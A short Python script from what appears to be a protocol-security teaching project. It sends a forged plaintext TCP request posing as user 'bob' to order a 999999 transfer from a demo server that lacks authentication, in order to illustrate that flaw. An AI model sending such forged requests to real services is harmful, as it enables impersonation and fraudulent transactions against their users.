# protocols/improved/1_add_passwords_auth/attacker.py

"""
attacker.py - Attack Demo for No Auth, No Encryption

This script demonstrates a basic impersonation attack on a server that lacks authentication and encryption.
It constructs a forged TCP request mimicking a legitimate user ('bob') and sends it to the target server
to perform an unauthorized high-value transfer.

This example is used to illustrate the dangers of trusting client-side input and not verifying the identity
or integrity of incoming data in network protocol design.

Usage:
    python attacker.py --port 9000
"""

import argparse

from config import DEFAULT_HOST

from utils.attacker_runner import run_tcp_attack

parser = argparse.ArgumentParser()
parser.add_argument("--port", type=int, required=True, help="Target port to attack")
args = parser.parse_args()

server_host = DEFAULT_HOST
server_port = args.port

plain_text = "username=bob&action=transfer&amount=999999&password=hacker"
payload = plain_text

# Launch a TCP attack using forged plaintext and payload against the target server
response = run_tcp_attack(
    host=server_host,
    port=server_port,
    plain_text=plain_text,
    payload=payload,
    verbose=True
)
print()
